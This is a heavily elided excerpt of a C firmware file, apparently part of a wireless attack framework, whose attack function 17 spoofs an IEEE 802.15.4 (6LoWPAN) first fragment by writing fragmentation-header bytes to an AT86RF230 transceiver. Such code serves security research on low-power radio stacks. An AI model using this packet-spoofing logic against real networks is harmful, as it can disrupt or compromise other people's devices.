/*
 * fw/attacks/attack_17.c - Attack function with ID 17
 *
 ...
 * followed by a 124-byte first fragment,
...
#error "Unknown transceiver"
	...
	/* Wait for the transmission of the spoofed first fragment */
	_delay_us(560);

	/* Spoof a first fragment */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	...
	spi_send(0xc2);  /* Fragmentation Header */
	spi_send(0xc8);
